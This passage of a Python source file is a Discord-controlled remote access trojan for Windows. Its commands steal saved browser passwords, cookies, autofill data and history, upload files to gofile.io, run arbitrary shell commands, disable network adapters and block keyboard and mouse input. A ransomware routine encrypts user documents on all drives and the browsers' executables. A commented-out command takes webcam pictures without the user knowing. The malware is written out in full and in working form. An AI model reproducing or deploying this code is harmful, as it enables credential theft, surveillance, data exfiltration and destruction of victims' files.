    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error: {e}")
        return "Decryption failed"


def get_passwords(browser):
    master_key = get_master_key(browser)
    if not master_key:
        return {}
    
    login_db_path = os.path.join(os.environ['USERPROFILE'], f'AppData\\Local\\{browser}\\User Data\\Default\\Login Data')
    if not os.path.exists(login_db_path):
        print(f"{browser} browser not found.")
        return {}
    
    shutil.copy2(login_db_path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    result = {}
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username or decrypted_password:
                result[url] = [username, decrypted_password]
    except Exception as e:
        print(f"Error: {e}")

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        print(f"Error: {e}")

    return result

def grab_passwords():
    result = {}
    browsers = {
        "Google\\Chrome": "Chrome",
        "Microsoft\\Edge": "Edge",
        "Mozilla\\Firefox": "Firefox",
        "Yandex\\YandexBrowser": "Yandex",
        "BraveSoftware\\Brave-Browser": "Brave",
        "Opera Software\\Opera Stable": "Opera",
        "Vivaldi": "Vivaldi",
        "Arc": "Arc",
        "Discord": "Discord",
        "discordcanary": "Discord Canary",
        "Lightcord": "Lightcord",
        "discordptb": "Discord PTB",
        "Opera Software\\Opera GX Stable": "Opera GX",
        "Amigo": "Amigo",
        "Torch": "Torch",
        "Kometa": "Kometa",
        "Orbitum": "Orbitum",
        "CentBrowser": "CentBrowser",
        "7Star": "7Star",
        "Sputnik": "Sputnik",
        "Epic Privacy Browser": "Epic Privacy Browser",
        "uCozMedia\\Uran": "Uran",
        "Iridium": "Iridium"
    }

    for browser_key, browser_name in browsers.items():
        passwords = get_passwords(browser_key)
        for url, (username, password) in passwords.items():
            result[url] = [username, password, browser_name]

    return result


class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data'),
            'firefox': os.path.join(self.roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'opera': os.path.join(self.roaming, 'Opera Software', 'Opera Stable'),
            'edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data'),
            'yandex': os.path.join(self.appdata, 'Yandex', 'YandexBrowser', 'User Data'),
            'vivaldi': os.path.join(self.appdata, 'Vivaldi', 'User Data'),
            'arc': os.path.join(self.appdata, 'Arc', 'User Data'),
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

    def create_temp(self):
        temp_dir = os.path.expanduser("~/tmp")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20))) + '.db'
        path = os.path.join(temp_dir, file_name)
        open(path, "x").close()
        return path

    def get_master_key(self, path: str) -> bytes:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Error: {e}")
            return None

    def decrypt_cookie(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_cookie = cipher.decrypt(payload)[:-16].decode(errors='ignore')
        return decrypted_cookie

    def grab_cookies(self):
        cookies_data = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            
            local_state_path = os.path.join(path, 'Local State')
            if not os.path.isfile(local_state_path):
                print(f"Local State not found: {local_state_path}")
                continue
            
            master_key = self.get_master_key(local_state_path)
            if not master_key:
                continue

            for profile in self.profiles:
                cookies_path = os.path.join(path, profile, 'Network', 'Cookies')
                if not os.path.isfile(cookies_path):
                    continue

                process_name = name.lower()
                is_open = any(proc.info['name'].lower() == process_name for proc in psutil.process_iter(['name']))

                if is_open:
                    temp_cookie_file = self.create_temp()
                    try:
                        shutil.copy2(cookies_path, temp_cookie_file)
                        conn = sqlite3.connect(temp_cookie_file)
                        cursor = conn.cursor()

                        for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                            host_key, name, path, encrypted_value, expires_utc = res
                            try:
                                value = self.decrypt_cookie(encrypted_value, master_key)
                                if host_key and name and value:
                                    cookies_data.append(f"{name} | {host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{value}\n")
                            except Exception as e:
                                print(f"Cookie decryption failed: {e}")
                                continue
                        
                        cursor.close()
                        conn.close()
                    except (PermissionError, sqlite3.OperationalError) as e:
                        print(f"Error while copying file: {e}")
                    finally:
                        if os.path.exists(temp_cookie_file):
                            try:
                                os.remove(temp_cookie_file)
                            except PermissionError:
                                print(f"Temporary file could not be deleted: {temp_cookie_file}")
                else:
                    try:
                        conn = sqlite3.connect(cookies_path)
                        cursor = conn.cursor()

                        for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                            host_key, name, path, encrypted_value, expires_utc = res
                            try:
                                value = self.decrypt_cookie(encrypted_value, master_key)
                                if host_key and name and value:
                                    cookies_data.append(f"{name} | {host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{value}\n")
                            except Exception as e:
                                print(f"Cookie decryption failed: {e}")
                                continue

                        cursor.close()
                        conn.close()
                    except Exception as e:
                        print(f"Error reading database: {e}")

        return cookies_data

@bot.command()
async def gpass(ctx):
    passwords = grab_passwords()

    if not passwords:
        await ctx.send("🔒 No passwords found.")
        return

    temp_path = os.getenv("TEMP")
    file_path = os.path.join(temp_path, "passwords.txt")
    
    with open(file_path, "w", encoding='utf-8') as f:
        for url, (username, password, browser) in passwords.items():
            f.write(f"🔗 URL: {url}\n")
            f.write(f"👤 Username: {username}\n")
            f.write(f"🔑 Password: {password}\n")
            f.write(f"🌐 Browser: {browser}\n\n")

    await ctx.send(file=discord.File(file_path))

    os.remove(file_path)

@bot.command()
async def gck(ctx):
    browser = Browsers()
    cookies = browser.grab_cookies()

    if not cookies:
        await ctx.send("🔒 No cookies found.")
        return

    temp_path = os.getenv("TEMP")
    file_path = os.path.join(temp_path, "cookies.txt")
    with open(file_path, "w", encoding='utf-8') as f:
        for cookie in cookies:
            f.write(cookie)

    await ctx.send(file=discord.File(file_path))

    os.remove(file_path)

@bot.command()
async def ghist(ctx):
    outputs = get_history()

    browser_histories = {
        "Chrome": [],
        "Firefox": [],
        "Edge": [],
    }

    if hasattr(outputs, 'histories') and outputs.histories:
        for entry in outputs.histories:
            url, timestamp = entry
            if "chrome" in url:
                browser_histories["Chrome"].append((url, timestamp))
            elif "firefox" in url:
                browser_histories["Firefox"].append((url, timestamp))
            elif "edge" in url:
                browser_histories["Edge"].append((url, timestamp))

        for browser, history in browser_histories.items():
            if history:
                formatted_history = "\n".join([f"{url} - {timestamp}" for url, timestamp in history])

                temp_path = os.getenv("TEMP")
                file_path = os.path.join(temp_path, f"{browser}_history.txt")
                with open(file_path, "w", encoding='utf-8') as f:
                    f.write(formatted_history)

                server_response = requests.get('https://api.gofile.io/servers')
                if server_response.status_code == 200:
                    servers = server_response.json()['data']['servers']
                    if servers:
                        server_name = servers[0]['name']
                        upload_url = f'https://{server_name}.gofile.io/contents/uploadfile'
                    else:
                        await ctx.send("[!] No server found.")
                        os.remove(file_path)
                        continue
                else:
                    await ctx.send("[!] Could not get server info.")
                    os.remove(file_path)
                    continue

                try:
                    with open(file_path, 'rb') as f:
                        files = {'file': f}
                        response = requests.post(upload_url, files=files)

                    if response.status_code == 200:
                        json_response = response.json()
                        if json_response['status'] == 'ok':
                            download_link = json_response['data']['downloadPage']
                            await ctx.send(f"{browser} history: {download_link}")
                        else:
                            await ctx.send(f"[!] Error during {browser} upload: {json_response['message']}")
                    else:
                        await ctx.send(f"[!] HTTP Error: {response.status_code} - {response.text}")

                except Exception as e:
                    await ctx.send(f"[!] Error for {browser}: {str(e)}")

                os.remove(file_path)
            else:
                await ctx.send(f"🔒 No history found for {browser} or not supported.")
    else:
        await ctx.send("🔒 No history found or not supported.")

async def get_autofill(path):
    path_split = path.split("\\")
    
    if "Local" in path:
        browser = path_split[path_split.index("Local") + 1]
    else:
        browser = path_split[path_split.index("Roaming") + 1]
    
    if "Google" in browser:
        browser = "Chrome"
    elif "BraveSoftware" in browser:
        browser = "Brave"
    elif "Microsoft" in browser:
        browser = "Edge"
    elif "Mozilla" in browser:
        browser = "Firefox"
    elif "Vivaldi" in browser:
        browser = "Vivaldi"
    elif "Opera Software" in browser:
        browser = "Opera"
    elif "Yandex" in browser:
        browser = "Yandex"
    elif "Opera GX" in browser:
        browser = "Opera GX"
    
    autofill_data = []
    
    web_data_path = os.path.join(path, "Web Data")
    if os.path.exists(web_data_path):
        sql = sqlite3.connect(web_data_path)
        cursor = sql.cursor()

        cursor.execute("SELECT name, value, date_created, date_last_used, count FROM autofill")
        
        rows = cursor.fetchall()
        for row in rows:
            autofill_entry = {
                "Name": row[0],
                "Value": row[1],
                "Date Created (timestamp)": row[2],
                "Date Last Used (timestamp)": row[3],
                "Count": row[4],
                "Browser": browser
            }
            autofill_data.append(autofill_entry)

        sql.close()
    
    return autofill_data

@bot.command()
async def gaf(ctx):
    user_profile = os.path.expanduser("~")

    paths = [
        os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
        os.path.join(user_profile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default"),
        os.path.join(user_profile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", "your_profile.default"),
        os.path.join(user_profile, "AppData", "Local", "Vivaldi", "User Data", "Default"),
        os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera Stable"),
        os.path.join(user_profile, "AppData", "Roaming", "Yandex", "YandexBrowser", "User Data", "Default"),
        os.path.join(user_profile, "AppData", "Local", "Opera Software", "Opera GX Stable")
    ]

    all_autofills = []
    
    for path in paths:
        autofills = await get_autofill(path)
        all_autofills.extend(autofills)

    temp_file_path = os.path.join(os.getenv("TEMP"), "autofill_data.txt")
    with open(temp_file_path, "w", encoding='utf-8') as f:
        for autofill in all_autofills:
            f.write(f"Browser: {autofill['Browser']}, Name: {autofill['Name']}, Value: {autofill['Value']}, Date Created: {autofill['Date Created (timestamp)']}, Date Last Used: {autofill['Date Last Used (timestamp)']}, Count: {autofill['Count']}\n")

    await ctx.send(file=discord.File(temp_file_path))

    os.remove(temp_file_path)

def get_network_adapters():
    result = subprocess.run(
        ["netsh", "interface", "show", "interface"], 
        capture_output=True, 
        text=True,
        encoding='utf-8',
        errors='replace'
    )
    
    if result.returncode != 0:
        return None

    return result.stdout

def disable_network_adapter(adapter_name):
    try:
        subprocess.run(["netsh", "interface", "set", "interface", adapter_name, "disable"], check=True)
        return adapter_name
    except subprocess.CalledProcessError as e:
        return None

@bot.command()
async def beth(ctx):
    output = get_network_adapters()
    
    if output is None:
        await ctx.send("Could not retrieve network adapters.")
        return
    
    disabled_adapters = []
    
    for line in output.splitlines():
        if "Connected" in line:
            adapter_name_match = re.search(r'^\s*Enabled\s+Connected\s+\w+\s+(.+)', line.strip())
            if adapter_name_match:
                adapter_name = adapter_name_match.group(1)
                disabled_adapter = disable_network_adapter(adapter_name)
                if disabled_adapter:
                    disabled_adapters.append(disabled_adapter)
    
    if disabled_adapters:
        response = "Disabled network adapters:\n" + "\n".join(disabled_adapters)
        await ctx.send(response)
    else:
        await ctx.send("No network adapters were disabled.")


async def execute_command(command, ctx):
    # This function will run the command in a separate thread
    output = subprocess.run(command, capture_output=True, text=True, shell=True)
    
    if output.returncode == 0:
        result = output.stdout
        numb = len(result)

        # If the output is too long, save to file
        if numb > 1990:
            with open("output.txt", 'w') as f:
                f.write(result)
            file = discord.File("output.txt", filename="output.txt")
            await ctx.send("[*] Command successfully executed", file=file)
            os.remove("output.txt")
        else:
            await ctx.send(f"Executed command: `{command}`\nResult:\n```{result}```")
    else:
        await ctx.send(f"Executed command: `{command}`\nError:\n```{output.stderr}```")
@bot.command()
async def sexec(ctx, *, command: str):
    # Use a thread to avoid blocking the bot
    thread = threading.Thread(target=await execute_command(command, ctx))
    thread.start()
@bot.command()
async def sfl(ctx, *, filename: str):
    temp_file_path = os.path.join(os.getenv('TEMP'), 'search_results.txt')

    if os.path.exists(temp_file_path):
        os.remove(temp_file_path)

    drives = [f"{d}:" for d in string.ascii_uppercase if os.path.exists(f"{d}:")]

    for drive in drives:
        search_command = f'dir {drive}\\ /s /b | findstr /i "{filename}" >> "{temp_file_path}"'
        await ctx.send(f"Search command: `{search_command}`")
        process = await asyncio.create_subprocess_shell(search_command)
        await process.wait()

        if process.returncode != 0:
            await ctx.send(f"Error occurred during search, code: {process.returncode}")

    if os.path.exists(temp_file_path):
        try:
            with open(temp_file_path, 'r', encoding='cp1254') as f:
                results = f.read()

            if results:
                await ctx.send(f"Directories containing **{filename}**:\n```\n{results}```")
            else:
                await ctx.send(f"**{filename}** not found.")

        except Exception as e:
            await ctx.send(f"An error occurred: {e}")
        finally:
            if os.path.exists(temp_file_path):
                os.remove(temp_file_path)
    else:
        await ctx.send("Failed to retrieve search results.")



@bot.command()
async def listcon(ctx):
    try:
        computer_name = platform.node()
        os_info = platform.platform()
        user_name = getpass.getuser()
        is_admin = "Admin" if psutil.WINDOWS and ctypes.windll.shell32.IsUserAnAdmin() else "User"
        ip_address = get_external_ip()

        location_response = requests.get('https://ipinfo.io/json')
        location_info = location_response.json()
        
        country = location_info.get('country', 'Unknown')
        city = location_info.get('city', 'Unknown')
        
        flag_emoji = f":flag_{country.lower()}:"

        info = (
            f"{'Connected Devices':^123}\n"
            f"PC-Name: {computer_name}|  "
            f"OS: {os_info}|  "
            f"Username: {user_name}|  "
            f"Privilege Level: {is_admin}|  "
            f"City: {city}|  "
            f"Country: {country}|  "
            f"IP Address: {ip_address}"
        )

        await ctx.send("```\n" + info + "\n```")

    except Exception as e:
        await ctx.send(f"[!] Error: {str(e)}")

@bot.command()
async def ufile(ctx, file_path: str, download_location: str):
    server_response = requests.get('https://api.gofile.io/servers')
    if server_response.status_code == 200:
        servers = server_response.json()['data']['servers']
        if servers:
            server_name = servers[0]['name']
            upload_url = f'https://{server_name}.gofile.io/contents/uploadfile'
        else:
            await ctx.send("[!] No server found.")
            return
    else:
        await ctx.send("[!] Unable to get server information.")
        return

    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(upload_url, files=files)

        if response.status_code == 200:
            json_response = response.json()
            if json_response['status'] == 'ok':
                download_link = json_response['data']['downloadPage']
                await ctx.send(f"File uploaded successfully: {download_link}")

                download_command = f'powershell -Command "Invoke-WebRequest -Uri \'{download_link}\' -OutFile \'{download_location}\'"'
                process = await asyncio.create_subprocess_shell(download_command)
                await process.wait()

                if process.returncode == 0:
                    await ctx.send(f"File downloaded successfully: {download_location}")
                else:
                    await ctx.send("[!] Error downloading the file.")
            else:
                await ctx.send(f"[!] Gofile upload error: {json_response['message']}")
        else:
            await ctx.send(f"[!] HTTP Error: {response.status_code} - {response.text}")

    except Exception as e:
        await ctx.send(f"[!] Error: {str(e)}")


@bot.command()
async def dfile(ctx, *, input_path: str):
    temp_file_path = os.path.join(os.getenv('TEMP'), 'search_results.txt')

    # Find available drives
    drives = [f"{d}:" for d in string.ascii_uppercase if os.path.exists(f"{d}:")]

    found_files = []

    # File search operation
    for drive in drives:
        if os.path.isdir(input_path):  # If a path is given
            search_command = f'dir "{input_path}" /b'
        else:  # Otherwise, search by file name
            search_command = f'dir {drive}\\ /s /b | findstr /i "{input_path}"'

        process = await asyncio.create_subprocess_shell(search_command, stdout=asyncio.subprocess.PIPE)
        stdout, _ = await process.communicate()

        if process.returncode == 0:
            found_files.extend(stdout.decode('cp1254').strip().splitlines())

    # Upload found files to Gofile
    if found_files:
        for file_path in found_files:
            try:
                # Upload to Gofile
                server_response = requests.get('https://api.gofile.io/servers')
                if server_response.status_code == 200:
                    servers = server_response.json()['data']['servers']
                    if servers:
                        server_name = servers[0]['name']
                        upload_url = f'https://{server_name}.gofile.io/contents/uploadfile'
                    else:
                        await ctx.send("[!] No server found.")
                        return

                with open(file_path, 'rb') as f:
                    files = {'file': f}
                    response = requests.post(upload_url, files=files)

                if response.status_code == 200:
                    json_response = response.json()
                    if json_response['status'] == 'ok':
                        download_link = json_response['data']['downloadPage']
                        await ctx.send(f"File uploaded successfully: {download_link}")
                    else:
                        await ctx.send(f"[!] Gofile upload error: {json_response['message']}")
                else:
                    await ctx.send(f"[!] HTTP Error: {response.status_code} - {response.text}")

            except Exception as e:
                await ctx.send(f"[!] Error: {str(e)}")
    else:
        await ctx.send(f"[!] **{input_path}** file not found.")

@bot.command()
async def rf(ctx, *, file_path: str):
    """Opens the specified file path."""
    try:
        os.startfile(file_path)
        await ctx.send(f"[*] {file_path} opened successfully.")
    except Exception as e:
        await ctx.send(f"[!] Error: {str(e)}")

@bot.command()
async def chcksrv(ctx, service_name: str):
    """Checks if the specified service is running."""
    def check_service(service_name):
        try:
            output = subprocess.check_output(f'sc query "{service_name}"', shell=True).decode()
            return "RUNNING" in output
        except subprocess.CalledProcessError:
            return False

    if check_service(service_name):
        await ctx.send(f"The {service_name} service is running.")
    else:
        await ctx.send(f"The {service_name} service is not running.")

@bot.command()
async def chckfile(ctx, file_name: str):
    """Checks if the specified file is open."""
    
    def check_file_open(file_name):
        extensions = ['.exe', '.pdf', '.mp3', '.txt', '.jpg', '.png'] 
        for proc in psutil.process_iter(['name', 'exe']):
            try:
                exe_path = proc.info['exe']
                if exe_path and any(exe_path.lower().endswith(ext) for ext in extensions):
                    if file_name.lower() in exe_path.lower():
                        return True
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        return False

    if check_file_open(file_name):
        await ctx.send(f"The {file_name} file is open.")
    else:
        await ctx.send(f"The {file_name} file is closed.")

@bot.command()
async def listdrives(ctx):
    """Lists the attached drives in the system."""
    def list_all_drives():
        all_drives = []
        for part in psutil.disk_partitions():
            all_drives.append(part.device)
        return all_drives

    all_drives = list_all_drives()
    if all_drives:
        await ctx.send("Attached Drives:\n" + "\n".join(all_drives))
    else:
        await ctx.send("No drives are attached.")

@bot.command()
async def startrnsm(ctx):
    key = Fernet.generate_key()
    temp_dir = os.path.join(os.environ['TEMP'], 'key.siktim')  
    with open(temp_dir, 'wb') as key_file:
        key_file.write(key)
    
    await ctx.send("Please enter the key for encryption:")


@bot.command()
async def rnsmkey(ctx, *, anahtar):
    temp_dir = os.path.join(os.environ['TEMP'], 'key.siktim')
    
    if not os.path.exists(temp_dir):
        await ctx.send("Key file not found.")
        return

    with open(temp_dir, 'rb') as key_file:
        saved_key = key_file.read()

    if anahtar.encode() != saved_key:
        await ctx.send("Invalid key!")
        return

    cipher = Fernet(saved_key)
    prevent_shutdown()

    all_drives = get_all_drives()
    matched_files = []
    for drive in all_drives:
        matched_files.extend(find_files_with_extensions(f"{drive}\\"))

    start_time = time.time()
    encrypt_files(matched_files, cipher)
    encrypt_browser_executables(cipher)
    end_time = time.time()

    total_time = end_time - start_time

    await ctx.send(f"Encryption process completed. Total time: {total_time:.2f} seconds.")
    

def find_files_with_extensions(directory):
    matched_files = []
    try:
        for entry in os.scandir(directory):
            if entry.is_file() and entry.name.lower().endswith(( 
                '.doc', '.docx', '.xls', '.xlsx', 
                '.ppt', '.pptx', '.pdf', '.txt', 
                '.jpg', '.jpeg', '.png', '.gif', '.bmp',
                '.mp3', '.mp4', '.avi',
                '.zip', '.rar',
                '.sql', '.mdb',
                '.java', '.py', '.c', '.cpp',
                '.exe'
            )):
                matched_files.append(entry.path)
            elif entry.is_dir():
                matched_files.extend(find_files_with_extensions(entry.path))
    except PermissionError:
        pass
    return matched_files

def encrypt_files(files, cipher):
    for file_path in files:
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            encrypted_data = cipher.encrypt(file_data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
            print(f"'{file_path}' file encrypted.")
        except PermissionError:
            print(f"Permission error for '{file_path}'. Skipped encryption.")
        except Exception as e:
            print(f"Error occurred for '{file_path}': {e}. Skipped encryption.")

def encrypt_browser_executables(cipher):
    browsers = {
        'chrome': os.path.join(os.getenv('PROGRAMFILES'), 'Google', 'Chrome', 'Application', 'chrome.exe'),
        'edge': os.path.join(os.getenv('PROGRAMFILES'), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        'firefox': os.path.join(os.getenv('PROGRAMFILES'), 'Mozilla Firefox', 'firefox.exe'),
        'opera': os.path.join(os.getenv('PROGRAMFILES'), 'Opera Software', 'Opera Stable', 'opera.exe'),
        'vivaldi': os.path.join(os.getenv('PROGRAMFILES'), 'Vivaldi', 'Application', 'vivaldi.exe'),
        'brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        'yandex': os.path.join(os.getenv('PROGRAMFILES'), 'Yandex', 'YandexBrowser', 'browser.exe'),
        'opera_gx': os.path.join(os.getenv('PROGRAMFILES'), 'Opera GX', 'launcher.exe')
    }

    for name, path in browsers.items():
        if os.path.exists(path):
            try:
                encrypt_files([path], cipher)
                print(f"{name.capitalize()} browser executable encrypted.")
            except Exception as e:
                print(f"Error occurred for {name.capitalize()} browser executable: {e}. Skipped encryption.")

def get_all_drives():
    return [drive for drive in os.listdir('..') if os.path.ismount(os.path.join('..', drive))]

def prevent_shutdown():
    ctypes.windll.user32.SetThreadExecutionState(0x80000002)


@bot.command()
async def usb(ctx, *, file_path: str):
    response = monitor_usb_and_open_file(file_path)
    await ctx.send(response)

def monitor_usb_and_open_file(file_name):
    def get_usb_drive():
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]

        for drive in drives:
            drive_type = win32api.GetDriveType(drive)
            if drive_type == win32con.DRIVE_REMOVABLE:
                return drive
        return None

    usb_drive = get_usb_drive()
    if usb_drive:
        file_path = os.path.join(usb_drive, file_name)
        if os.path.exists(file_path):
            subprocess.Popen(['notepad.exe', file_path])  # example
            return f"{file_path} file opened."
        else:
            return "File not found."
    else:
        return "USB drive not found."
    
def change_wallpaper(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        return "Wallpaper changed successfully."
    except Exception as e:
        return f"Failed to change wallpaper: {e}"
@bot.command()
async def wllppr(ctx, path_or_url: str):
 
    temp_image_path = "temp_image.jpg"

    if path_or_url.startswith("http://") or path_or_url.startswith("https://"):
        try:
            response = requests.get(path_or_url, stream=True)
            if response.status_code == 200:
                with open(temp_image_path, 'wb') as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)

                
                if os.path.isfile(temp_image_path):
                    result = change_wallpaper(temp_image_path)
                    await ctx.send(result)
                else:
                    await ctx.send("Image not found.")
            else:
                await ctx.send("Failed to download the image, please ensure it's a valid link.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    else:
        # If it's a file path
        if os.path.isfile(path_or_url):
            result = change_wallpaper(path_or_url)
            await ctx.send(result)
        else:
            await ctx.send("The specified file path was not found.")

async def binput(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        windll.user32.BlockInput(True)
        await ctx.send("[*] Input blocking successfully executed.")
    else:
        await ctx.send("[!] Admin rights are required for this operation.")

@bot.command()
async def ubinput(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        windll.user32.BlockInput(False)
        await ctx.send("[*] Input blocking successfully removed.")
    else:
        await ctx.send("[!] Admin rights are required for this operation.")
"""
@bot.command()
async def wbcam(ctx):
    # Change to temporary directory
    directory = os.getcwd()
    try:
        os.chdir(os.getenv('TEMP'))
        
     
        urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", "temp.zip")
        
       
        with ZipFile("temp.zip") as zipObj:
            zipObj.extractall()
        
       
        os.system("WebCamImageSave.exe /capture /FileName temp.png /NoLight")
        
        # Send the captured image
        file = discord.File("temp.png", filename="temp.png")
        await ctx.send("[*] Command successfully executed", file=file)

        # Cleanup
        os.remove("temp.zip")
        os.remove("temp.png")
        os.remove("WebCamImageSave.exe")
        os.remove("readme.txt")
        os.remove("WebCamImageSave.chm")
        os.chdir(directory)
        
    except Exception as e:
        await ctx.send(f"[!] Command failed: {str(e)}")

"""

bot.run(BOT_TOKEN)
